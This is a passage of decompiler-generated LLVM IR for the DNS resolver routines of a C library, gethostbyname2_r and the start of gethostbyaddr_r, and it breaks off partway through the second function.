  %v1_805f5a8 = call i32 @free(i32 %v3_805f5a4)
  store i32 1, i32* %v1_805f2fd, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f59c

dec_label_pc_805f5c1:                             ; preds = %dec_label_pc_805f36b, %dec_label_pc_805f34f, %dec_label_pc_805f343, %dec_label_pc_805f330, %dec_label_pc_805f324
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f5c6

dec_label_pc_805f5c6:                             ; preds = %dec_label_pc_805f310, %dec_label_pc_805f309, %dec_label_pc_805f2c5, %entry, %dec_label_pc_805f59c, %dec_label_pc_805f45e, %dec_label_pc_805f3b8, %dec_label_pc_805f5c1
  store i32 %v0_805f29f, i32* @ebx, align 4
  store i32 %v0_805f29e, i32* @esi, align 4
  store i32 %v0_805f29d, i32* @edi, align 4
  store i32 %v0_805f29c, i32* @ebp, align 4
  %v0_805f5cd = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805f5cd

; uselistorder directives
  uselistorder i32 %v1_805f385, { 1, 0, 2 }
  uselistorder i32 %v1_805f37e, { 2, 1, 0 }
  uselistorder i32 %v1_805f36b, { 2, 4, 1, 3, 0, 5 }
  uselistorder i32 %v0_805f334.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805f31d, { 1, 0 }
  uselistorder i32 %v2_805f2fd, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805f2fd, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805f2af, { 1, 0, 2 }
  uselistorder i32* %stack_var_-108, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805f5c6, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805f59c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805f330, { 1, 0 }
}

define i32 @gethostbyname2_r() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_805f5d0 = load i32, i32* @ebp, align 4
  %v0_805f5d1 = load i32, i32* @edi, align 4
  %v0_805f5d2 = load i32, i32* @esi, align 4
  %v0_805f5d3 = load i32, i32* @ebx, align 4
  store i32 %tmp15, i32* %eax.global-to-local, align 4
  store i32 %tmp13, i32* @esi, align 4
  %v9_805f5e6 = icmp eq i32 %tmp15, 2
  %v1_805f5e9 = icmp eq i1 %v9_805f5e6, false
  br i1 %v1_805f5e9, label %dec_label_pc_805f618, label %dec_label_pc_805f5eb

dec_label_pc_805f5eb:                             ; preds = %entry
  store i32 %tmp11, i32* %stack_var_-124, align 4
  store i32 %tmp9, i32* %stack_var_-140, align 4
  %v7_805f60b = inttoptr i32 %tmp10 to i32*
  %v8_805f60b = call i32 @gethostbyname_r(i32 %tmp9, i32* %v7_805f60b, i32 %tmp13, i32 %tmp11, i32 %tmp12, i32 %tmp15, i32 %tmp15)
  store i32 %v8_805f60b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f618:                             ; preds = %entry
  %v9_805f618 = icmp eq i32 %tmp15, 10
  %v1_805f61b = icmp eq i1 %v9_805f618, false
  br i1 %v1_805f61b, label %dec_label_pc_805f8c5, label %dec_label_pc_805f621

dec_label_pc_805f621:                             ; preds = %dec_label_pc_805f618
  %v3_805f621 = call i32 @__open_nameservers(i32 %v0_805f5d3, i32 %v0_805f5d2, i32 %v0_805f5d1)
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805f62d = inttoptr i32 %tmp11 to i32*
  store i32 0, i32* %v1_805f62d, align 4
  %v4_805f633 = icmp eq i32 %tmp9, 0
  br i1 %v4_805f633, label %dec_label_pc_805f8c5, label %dec_label_pc_805f63e

dec_label_pc_805f63e:                             ; preds = %dec_label_pc_805f621
  %v0_805f63e = load i32, i32* %stack_var_-140, align 4
  %v1_805f63e = call i32 @__errno_location(i32 %v0_805f63e)
  store i32 %v1_805f63e, i32* %eax.global-to-local, align 4
  %v1_805f643 = inttoptr i32 %v1_805f63e to i32*
  %v2_805f643 = load i32, i32* %v1_805f643, align 4
  store i32 %v2_805f643, i32* @edi, align 4
  store i32 %v1_805f63e, i32* @ebx, align 4
  store i32 0, i32* %v1_805f643, align 4
  %v0_805f65c = load i32, i32* @esi, align 4
  store i32 %v0_805f65c, i32* %stack_var_-124, align 4
  store i32 %tmp9, i32* %stack_var_-140, align 4
  %v7_805f66e = call i32 @__get_hosts_byname_r(i32 %tmp9, i32 10, i32 %tmp10, i32 %v0_805f65c, i32 %tmp11, i32 %tmp12, i32 %v1_805f63e)
  store i32 %v7_805f66e, i32* %eax.global-to-local, align 4
  %v1_805f676 = icmp eq i32 %v7_805f66e, 0
  br i1 %v1_805f676, label %dec_label_pc_805f8f7, label %dec_label_pc_805f67e

dec_label_pc_805f67e:                             ; preds = %dec_label_pc_805f63e
  store i32 %tmp12, i32* @ecx, align 4
  %v1_805f685 = inttoptr i32 %tmp12 to i32*
  %v2_805f685 = load i32, i32* %v1_805f685, align 4
  store i32 %v2_805f685, i32* %edx.global-to-local, align 4
  %v9_805f687 = icmp eq i32 %v2_805f685, 1
  br i1 %v9_805f687, label %dec_label_pc_805f69a, label %dec_label_pc_805f68c

dec_label_pc_805f68c:                             ; preds = %dec_label_pc_805f67e
  %v9_805f68c = icmp eq i32 %v2_805f685, 4
  br i1 %v9_805f68c, label %dec_label_pc_805f6ba, label %dec_label_pc_805f691

dec_label_pc_805f691:                             ; preds = %dec_label_pc_805f68c
  %v1_805f691 = add i32 %v2_805f685, 1
  %v8_805f691 = icmp eq i32 %v1_805f691, 0
  store i32 %v1_805f691, i32* %edx.global-to-local, align 4
  %v1_805f692 = icmp eq i1 %v8_805f691, false
  br i1 %v1_805f692, label %dec_label_pc_805f8f7, label %dec_label_pc_805f6a9

dec_label_pc_805f69a:                             ; preds = %dec_label_pc_805f67e
  %v9_805f69a = icmp eq i32 %v7_805f66e, 2
  %v1_805f69d = zext i1 %v9_805f69a to i32
  store i32 %v1_805f69d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f6ba

dec_label_pc_805f6a9:                             ; preds = %dec_label_pc_805f691
  %v0_805f6a9 = load i32, i32* @ebx, align 4
  %v1_805f6a9 = inttoptr i32 %v0_805f6a9 to i32*
  %v2_805f6a9 = load i32, i32* %v1_805f6a9, align 4
  %v11_805f6a9 = icmp eq i32 %v2_805f6a9, 2
  %v1_805f6ac = icmp eq i1 %v11_805f6a9, false
  br i1 %v1_805f6ac, label %dec_label_pc_805f8f7, label %dec_label_pc_805f6ba

dec_label_pc_805f6ba:                             ; preds = %dec_label_pc_805f68c, %dec_label_pc_805f6a9, %dec_label_pc_805f69a
  %storemerge = phi i32 [ %v1_805f69d, %dec_label_pc_805f69a ], [ 0, %dec_label_pc_805f6a9 ], [ 0, %dec_label_pc_805f68c ]
  %v0_805f6ba = load i32, i32* @edi, align 4
  %v1_805f6ba = load i32, i32* @ebx, align 4
  %v2_805f6ba = inttoptr i32 %v1_805f6ba to i32*
  store i32 %v0_805f6ba, i32* %v2_805f6ba, align 4
  %v0_805f6bc = load i32, i32* @esi, align 4
  store i32 %tmp12, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805f685, align 4
  %tmp33 = icmp ult i32 %v0_805f6bc, 16
  br i1 %tmp33, label %dec_label_pc_805f8f2, label %dec_label_pc_805f6d2

dec_label_pc_805f6d2:                             ; preds = %dec_label_pc_805f6ba
  %v0_805f6d2 = load i32, i32* @esi, align 4
  %v1_805f6d2 = add i32 %v0_805f6d2, -16
  store i32 %v1_805f6d2, i32* %eax.global-to-local, align 4
  %tmp34 = icmp ult i32 %v1_805f6d2, 8
  br i1 %tmp34, label %dec_label_pc_805f8f2, label %dec_label_pc_805f6de

dec_label_pc_805f6de:                             ; preds = %dec_label_pc_805f6d2
  %v1_805f6e2 = add i32 %v0_805f6d2, -24
  store i32 %v1_805f6e2, i32* @esi, align 4
  store i32 %tmp10, i32* @ecx, align 4
  %v1_805f6ed = add i32 %tmp10, 16
  store i32 %v1_805f6ed, i32* %edx.global-to-local, align 4
  %v3_805f6f4 = inttoptr i32 %v1_805f6ed to i32*
  store i32 %tmp10, i32* %v3_805f6f4, align 4
  %v0_805f6f7 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f6f7 = add i32 %v0_805f6f7, 4
  %v2_805f6f7 = inttoptr i32 %v1_805f6f7 to i32*
  store i32 0, i32* %v2_805f6f7, align 4
  %tmp35 = icmp ult i32 %v1_805f6e2, 256
  br i1 %tmp35, label %dec_label_pc_805f8f2, label %dec_label_pc_805f70c

dec_label_pc_805f70c:                             ; preds = %dec_label_pc_805f6de
  %v0_805f70d = load i32, i32* @ecx, align 4
  %v1_805f713 = add i32 %v0_805f70d, 24
  store i32 %v1_805f713, i32* @edi, align 4
  store i32 %v1_805f713, i32* %stack_var_-124, align 4
  %v3_805f71b = inttoptr i32 %v1_805f713 to i8*
  %v4_805f71b = call i32 @strncpy(i8* %v3_805f71b, i32 %tmp9, i32 %v1_805f6e2)
  store i32 %v4_805f71b, i32* %eax.global-to-local, align 4
  store i32 10, i32* %stack_var_-124, align 4
  %v3_805f730 = inttoptr i32 %tmp9 to i8*
  %v4_805f730 = call i32 @inet_pton(i32 10, i8* %v3_805f730, i32 %tmp10)
  store i32 %v4_805f730, i32* %eax.global-to-local, align 4
  %v1_805f738 = icmp eq i32 %v4_805f730, 0
  br i1 %v1_805f738, label %dec_label_pc_805f771, label %dec_label_pc_805f73c

dec_label_pc_805f73c:                             ; preds = %dec_label_pc_805f70c
  %v0_805f73c = load i32, i32* @edi, align 4
  %v1_805f73c = load i32, i32* @ebp, align 4
  %v2_805f73c = inttoptr i32 %v1_805f73c to i32*
  store i32 %v0_805f73c, i32* %v2_805f73c, align 4
  %v0_805f73f = load i32, i32* @ebp, align 4
  %v1_805f73f = add i32 %v0_805f73f, 8
  %v2_805f73f = inttoptr i32 %v1_805f73f to i32*
  store i32 10, i32* %v2_805f73f, align 4
  %v0_805f746 = load i32, i32* @ebp, align 4
  %v1_805f746 = add i32 %v0_805f746, 12
  %v2_805f746 = inttoptr i32 %v1_805f746 to i32*
  store i32 16, i32* %v2_805f746, align 4
  %v1_805f751 = load i32, i32* @ebp, align 4
  %v2_805f751 = add i32 %v1_805f751, 16
  %v3_805f751 = inttoptr i32 %v2_805f751 to i32*
  store i32 %v1_805f6ed, i32* %v3_805f751, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_805f75d = load i32, i32* @ebp, align 4
  store i32 %v0_805f75d, i32* %v1_805f62d, align 4
  store i32 %tmp12, i32* @ecx, align 4
  store i32 0, i32* %v1_805f685, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f771:                             ; preds = %dec_label_pc_805f70c
  %v4_805f771 = icmp eq i32 %storemerge, 0
  %v1_805f776 = icmp eq i1 %v4_805f771, false
  br i1 %v1_805f776, label %dec_label_pc_805f8cc, label %dec_label_pc_805f77c

dec_label_pc_805f77c:                             ; preds = %dec_label_pc_805f771
  %v2_805f781 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_805f781, i32* %eax.global-to-local, align 4
  store i32 %v2_805f781, i32* %stack_var_-124, align 4
  %v3_805f786 = bitcast i32* %stack_var_-76 to i8*
  %v4_805f786 = call i32 @__GI_memset(i8* %v3_805f786, i32 0, i32 40)
  store i32 %v4_805f786, i32* %eax.global-to-local, align 4
  %v2_805f7a1 = ptrtoint i32* %stack_var_-36 to i32
  %v2_805f7ce = ptrtoint i32* %stack_var_-20 to i32
  %v9_805f80c = icmp eq i32 %tmp4, 5
  %v1_805f80f = icmp eq i1 %v9_805f80c, false
  br label %dec_label_pc_805f796

dec_label_pc_805f796:                             ; preds = %dec_label_pc_805f83a, %dec_label_pc_805f77c
  %stack_var_-96.0 = phi i32 [ 0, %dec_label_pc_805f77c ], [ %v4_805f83a, %dec_label_pc_805f83a ]
  store i32 %v2_805f7a1, i32* @ebx, align 4
  store i32 %v2_805f7a1, i32* %stack_var_-124, align 4
  %v4_805f7a6 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134589241, i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  store i32 %v4_805f7a6, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %stack_var_-124, align 4
  %v1_805f7b2 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  %v2_805f7bd = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805f7bd, i32* @ecx, align 4
  store i32 134589241, i32* %eax.global-to-local, align 4
  store i32 %v2_805f7a1, i32* %stack_var_-124, align 4
  %v3_805f7c2 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %v2_805f7ce, i32* %eax.global-to-local, align 4
  store i32 %v2_805f7ce, i32* %stack_var_-124, align 4
  %v0_805f7d8 = load i32, i32* @esi, align 4
  %v0_805f7db = load i32, i32* @edi, align 4
  store i32 %v0_805f7db, i32* %stack_var_-140, align 4
  %v6_805f7dc = inttoptr i32 %v0_805f7db to i8*
  %v7_805f7dc = call i32 @__dns_lookup(i8* %v6_805f7dc, i32 28, i32 %v0_805f7d8, i32 ptrtoint (i32* @global_var_807f834.676 to i32), i32 %v2_805f7ce, i32 %v2_805f781)
  store i32 %v7_805f7dc, i32* %eax.global-to-local, align 4
  %v2_805f7e4 = icmp slt i32 %v7_805f7dc, 0
  br i1 %v2_805f7e4, label %dec_label_pc_805f8cc, label %dec_label_pc_805f7ec

dec_label_pc_805f7ec:                             ; preds = %dec_label_pc_805f796
  %v3_805f7f1 = load i32, i32* %stack_var_-76, align 4
  %v0_805f7f5 = load i32, i32* @edi, align 4
  store i32 %v0_805f7f5, i32* %stack_var_-124, align 4
  %v3_805f7f6 = inttoptr i32 %v0_805f7f5 to i8*
  %v4_805f7f6 = call i32 @strncpy(i8* %v3_805f7f6, i32 %v3_805f7f1, i32 %v1_805f6e2)
  store i32 %v4_805f7f6, i32* %eax.global-to-local, align 4
  %v2_805f7fb = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805f7fb, i32* @ebx, align 4
  %v3_805f7fc = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805f7fc, i32* %stack_var_-124, align 4
  %v1_805f800 = call i32 @free(i32 %v3_805f7fc)
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  br i1 %v1_805f80f, label %dec_label_pc_805f84e, label %dec_label_pc_805f811

dec_label_pc_805f811:                             ; preds = %dec_label_pc_805f7ec
  %v0_805f815 = load i32, i32* @edi, align 4
  %v3_805f81a = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f81a, i32* %stack_var_-124, align 4
  %v4_805f81e = call i32 @__decode_dotted(i32 %v3_805f81a, i32 %tmp3, i32 %v0_805f815, i32 %v1_805f6e2)
  store i32 %v4_805f81e, i32* %eax.global-to-local, align 4
  %v2_805f823 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805f823, i32* @ecx, align 4
  %v3_805f824 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f824, i32* %stack_var_-124, align 4
  store i32 %v4_805f81e, i32* @ebx, align 4
  %v1_805f82a = call i32 @free(i32 %v3_805f824)
  store i32 %v1_805f82a, i32* %eax.global-to-local, align 4
  %v2_805f832 = icmp slt i32 %v4_805f81e, 0
  br i1 %v2_805f832, label %dec_label_pc_805f8e0, label %dec_label_pc_805f83a

dec_label_pc_805f83a:                             ; preds = %dec_label_pc_805f811
  %v4_805f83a = add nuw nsw i32 %stack_var_-96.0, 1
  %v7_805f843 = icmp sgt i32 %stack_var_-96.0, 4
  br i1 %v7_805f843, label %dec_label_pc_805f8e0, label %dec_label_pc_805f796

dec_label_pc_805f84e:                             ; preds = %dec_label_pc_805f7ec
  %v9_805f84e = icmp eq i32 %tmp4, 28
  %v1_805f851 = icmp eq i1 %v9_805f84e, false
  br i1 %v1_805f851, label %dec_label_pc_805f8a2, label %dec_label_pc_805f853

dec_label_pc_805f853:                             ; preds = %dec_label_pc_805f84e
  store i32 %tmp10, i32* %stack_var_-124, align 4
  %v3_805f861 = inttoptr i32 %tmp10 to i16*
  %v4_805f861 = call i32 @memcpy(i16* %v3_805f861, i32 %tmp, i32 16)
  %v0_805f866 = load i32, i32* @edi, align 4
  %v1_805f866 = load i32, i32* @ebp, align 4
  %v2_805f866 = inttoptr i32 %v1_805f866 to i32*
  store i32 %v0_805f866, i32* %v2_805f866, align 4
  %v0_805f869 = load i32, i32* @ebp, align 4
  %v1_805f869 = add i32 %v0_805f869, 8
  %v2_805f869 = inttoptr i32 %v1_805f869 to i32*
  store i32 10, i32* %v2_805f869, align 4
  %v0_805f870 = load i32, i32* @ebp, align 4
  %v1_805f870 = add i32 %v0_805f870, 12
  %v2_805f870 = inttoptr i32 %v1_805f870 to i32*
  store i32 16, i32* %v2_805f870, align 4
  store i32 %v1_805f6ed, i32* @ecx, align 4
  %v1_805f87b = load i32, i32* @ebp, align 4
  %v2_805f87b = add i32 %v1_805f87b, 16
  %v3_805f87b = inttoptr i32 %v2_805f87b to i32*
  store i32 %v1_805f6ed, i32* %v3_805f87b, align 4
  %v2_805f87e = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805f87e, i32* %eax.global-to-local, align 4
  %v3_805f87f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f87f, i32* %stack_var_-124, align 4
  %v1_805f883 = call i32 @free(i32 %v3_805f87f)
  %v0_805f88f = load i32, i32* @ebp, align 4
  store i32 %v0_805f88f, i32* %v1_805f62d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp12, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f8c0

dec_label_pc_805f8a2:                             ; preds = %dec_label_pc_805f84e
  %v3_805f8a5 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f8a5, i32* %stack_var_-124, align 4
  %v1_805f8a9 = call i32 @free(i32 %v3_805f8a5)
  store i32 %tmp12, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8c0

dec_label_pc_805f8c0:                             ; preds = %dec_label_pc_805f853, %dec_label_pc_805f8a2
  %storemerge1 = phi i32 [ 0, %dec_label_pc_805f853 ], [ 1, %dec_label_pc_805f8a2 ]
  store i32 %storemerge1, i32* %v1_805f685, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f8c5:                             ; preds = %dec_label_pc_805f621, %dec_label_pc_805f618
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f8cc:                             ; preds = %dec_label_pc_805f796, %dec_label_pc_805f771
  store i32 1, i32* %v1_805f685, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f8e0:                             ; preds = %dec_label_pc_805f83a, %dec_label_pc_805f811
  store i32 %tmp12, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 3, i32* %v1_805f685, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f8f2:                             ; preds = %dec_label_pc_805f6de, %dec_label_pc_805f6d2, %dec_label_pc_805f6ba
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8f7

dec_label_pc_805f8f7:                             ; preds = %dec_label_pc_805f6a9, %dec_label_pc_805f691, %dec_label_pc_805f63e, %dec_label_pc_805f8e0, %dec_label_pc_805f8cc, %dec_label_pc_805f8c5, %dec_label_pc_805f8c0, %dec_label_pc_805f73c, %dec_label_pc_805f5eb, %dec_label_pc_805f8f2
  store i32 %v0_805f5d3, i32* @ebx, align 4
  store i32 %v0_805f5d2, i32* @esi, align 4
  store i32 %v0_805f5d1, i32* @edi, align 4
  store i32 %v0_805f5d0, i32* @ebp, align 4
  %v0_805f8fe = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805f8fe

; uselistorder directives
  uselistorder i32 %v4_805f81e, { 1, 0, 2 }
  uselistorder i32 %v1_805f6ed, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805f6e2, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805f685, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805f685, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %v1_805f62d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0, 3 }
  uselistorder i32 %tmp15, { 0, 2, 3, 1, 4 }
  uselistorder i32 %tmp12, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp11, { 5, 0, 4, 3, 1, 2 }
  uselistorder i32 %tmp10, { 7, 6, 4, 0, 1, 5, 2, 3 }
  uselistorder i32 %tmp9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_805f8f7, { 9, 3, 4, 5, 6, 7, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_805f8c0, { 1, 0 }
  uselistorder label %dec_label_pc_805f6ba, { 1, 2, 0 }
}

define i32 @__GI_gethostbyaddr_r(i8* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = alloca i8*, align 4
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-140 = alloca i8*, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_805f900 = load i32, i32* @ebp, align 4
  %v0_805f901 = load i32, i32* @edi, align 4
  %v0_805f902 = load i32, i32* @esi, align 4
  %v4_805f907 = ptrtoint i8* %arg1 to i32
  store i8* %arg1, i8** %tmp, align 4
  store i32 %v4_805f907, i32* @esi, align 4
  store i32 %tmp31, i32* %eax.global-to-local, align 4
  %v2_805f920 = icmp eq i8* %arg1, null
  %v1_805f922 = inttoptr i32 %tmp31 to i32*
  store i32 0, i32* %v1_805f922, align 4
  br i1 %v2_805f920, label %dec_label_pc_805fc34, label %dec_label_pc_805f92e

dec_label_pc_805f92e:                             ; preds = %entry
  %v2_805f92e = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_805f92e, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-120, align 4
  store i32 %v2_805f92e, i32* %stack_var_-124, align 4
  %v4_805f938 = bitcast i32* %stack_var_-76 to i8*
  %v5_805f938 = call i32 @__GI_memset(i8* %v4_805f938, i32 0, i32 40)
  store i32 %v5_805f938, i32* %eax.global-to-local, align 4
  %v12_805f940 = icmp eq i32 %tmp28, 2
  br i1 %v12_805f940, label %dec_label_pc_805f954, label %dec_label_pc_805f947

dec_label_pc_805f947:                             ; preds = %dec_label_pc_805f92e
  %v12_805f947 = icmp eq i32 %tmp28, 10
  %v1_805f94c = icmp eq i1 %v12_805f947, false
  br i1 %v1_805f94c, label %dec_label_pc_805fc34, label %dec_label_pc_805f95b

dec_label_pc_805f954:                             ; preds = %dec_label_pc_805f92e
  %v4_805f954 = add i32 %tmp27, -4
  br label %dec_label_pc_805f960

dec_label_pc_805f95b:                             ; preds = %dec_label_pc_805f947
  %v4_805f95b = add i32 %tmp27, -16
  br label %dec_label_pc_805f960

dec_label_pc_805f960:                             ; preds = %dec_label_pc_805f954, %dec_label_pc_805f95b
  %storemerge8.in = phi i32 [ %v4_805f954, %dec_label_pc_805f954 ], [ %v4_805f95b, %dec_label_pc_805f95b ]
  %storemerge8 = icmp eq i32 %storemerge8.in, 0
  %v1_805f960 = icmp eq i1 %storemerge8, false
  br i1 %v1_805f960, label %dec_label_pc_805fc34, label %dec_label_pc_805f966

dec_label_pc_805f966:                             ; preds = %dec_label_pc_805f960
  %v0_805f974 = load i32, i32* @ebx, align 4
  %v5_805f974 = inttoptr i32 %v0_805f974 to i8*
  store i8* %v5_805f974, i8** %stack_var_-120, align 4
  %v0_805f975 = load i32, i32* @ebp, align 4
  store i32 %v0_805f975, i32* %stack_var_-124, align 4
  %tmp50 = bitcast i8** %tmp to i32*
  %v0_805f98b1 = load i32, i32* %tmp50, align 4
  %tmp51 = bitcast i8** %stack_var_-140 to i32*
  store i32 %v0_805f98b1, i32* %tmp51, align 4
  %v10_805f98c = call i32 @__get_hosts_byaddr_r(i32 %v0_805f98b1, i32 %tmp27, i32 %tmp28, i32 %tmp25, i32 %v0_805f974, i32 %tmp31, i32 %tmp26)
  store i32 %v10_805f98c, i32* %eax.global-to-local, align 4
  %v1_805f994 = icmp eq i32 %v10_805f98c, 0
  br i1 %v1_805f994, label %dec_label_pc_805fc66, label %dec_label_pc_805f99c

dec_label_pc_805f99c:                             ; preds = %dec_label_pc_805f966
  store i32 %tmp26, i32* @ecx, align 4
  %v1_805f9a3 = inttoptr i32 %tmp26 to i32*
  %v2_805f9a3 = load i32, i32* %v1_805f9a3, align 4
  store i32 %v2_805f9a3, i32* %edx.global-to-local, align 4
  %v9_805f9a5 = icmp eq i32 %v2_805f9a3, 1
  br i1 %v9_805f9a5, label %dec_label_pc_805f9b3, label %dec_label_pc_805f9aa

dec_label_pc_805f9aa:                             ; preds = %dec_label_pc_805f99c
  %v9_805f9aa = icmp eq i32 %v2_805f9a3, 4
  %v1_805f9ad = icmp eq i1 %v9_805f9aa, false
  br i1 %v1_805f9ad, label %dec_label_pc_805fc66, label %dec_label_pc_805f9b3

dec_label_pc_805f9b3:                             ; preds = %dec_label_pc_805f9aa, %dec_label_pc_805f99c
  %v0_805f9b3 = load i8*, i8** %stack_var_-140, align 4
  %v1_805f9b3 = ptrtoint i8* %v0_805f9b3 to i32
  %v5_805f9b3 = call i32 @__open_nameservers(i32 %v1_805f9b3, i32 %tmp27, i32 %tmp28)
  store i32 %tmp26, i32* %eax.global-to-local, align 4
  %v0_805f9bf = load i32, i32* @ebx, align 4
  store i32 -1, i32* %v1_805f9a3, align 4
  %tmp63 = icmp ult i32 %v0_805f9bf, 4
  br i1 %tmp63, label %dec_label_pc_805fc61, label %dec_label_pc_805f9ce

dec_label_pc_805f9ce:                             ; preds = %dec_label_pc_805f9b3
  %v0_805f9ce = load i32, i32* @ebx, align 4
  %v1_805f9ce = add i32 %v0_805f9ce, -4
  store i32 %v1_805f9ce, i32* %eax.global-to-local, align 4
  %tmp64 = icmp ult i32 %v1_805f9ce, 8
  br i1 %tmp64, label %dec_label_pc_805fc61, label %dec_label_pc_805f9da

dec_label_pc_805f9da:                             ; preds = %dec_label_pc_805f9ce
  %v1_805f9da = add i32 %v0_805f9ce, -12
  store i32 %v1_805f9da, i32* %eax.global-to-local, align 4
  %tmp65 = icmp ult i32 %v1_805f9da, 32
  br i1 %tmp65, label %dec_label_pc_805fc61, label %dec_label_pc_805f9e6

dec_label_pc_805f9e6:                             ; preds = %dec_label_pc_805f9da
  %tmp66 = icmp ult i32 %v0_805f9ce, 16
  br i1 %tmp66, label %dec_label_pc_805fc61, label %dec_label_pc_805f9ef

dec_label_pc_805f9ef:                             ; preds = %dec_label_pc_805f9e6
  %v1_805f9ef = add i32 %v0_805f9ce, -16
  store i32 %v1_805f9ef, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i32 %v1_805f9ef, 8
  br i1 %tmp67, label %dec_label_pc_805fc61, label %dec_label_pc_805f9fb

